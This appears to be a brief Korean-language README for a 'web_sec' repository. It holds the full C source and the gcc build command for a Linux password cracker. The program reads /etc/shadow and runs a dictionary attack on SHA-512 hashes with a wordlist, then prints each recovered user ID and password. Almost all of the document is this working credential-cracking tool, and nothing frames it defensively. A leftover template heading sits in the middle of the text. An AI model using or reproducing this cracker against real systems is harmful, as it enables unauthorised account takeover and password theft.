# web_sec
crypt file (hack.c) 을 실행파일로 만들기 위해서 gcc 명령어를 사용한다. ( yum -y install gcc )

**gcc -o hack hack.c -lcrypt** 

This is an H1
=============
// linux 계정 Password Cracking Code

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<crypt.h>

int main(int argc, char * argv[ ]){

        FILE * victim = fopen("/etc/shadow","r");
        FILE * attack = fopen("/hack/dic","r");

        char read_shadow[1024];
        char * id;
        char * hash;
        char hash2[1024];
        char * salt;
        char salt_value[30];
        char read_dic[100];


        char * victim_hash;


        while(fgets(read_shadow, 1024, victim)){
                id = strtok(read_shadow, ":");

                hash = strtok(NULL, ":");
                strcpy(hash2, hash);

                if(hash[0] != '$') continue;

                salt = strtok(hash2, "$");
                salt = strtok(NULL, "$");

                strcat(salt_value, "$6$");
                strcat(salt_value, salt);
                strcat(salt_value, "$");

                fseek(attack, 0, SEEK_SET);

                while(fgets(read_dic, 100, attack)!=NULL){
                        read_dic[strlen(read_dic)-1]='\0';
                        victim_hash = crypt(read_dic, salt_value);
                        if(!strcmp(hash, victim_hash)){
                                printf("ID : %s, PW : %s\n", id, read_dic);
                                break;
                        }
                }
                memset(salt_value, 0, 30);
        }
}
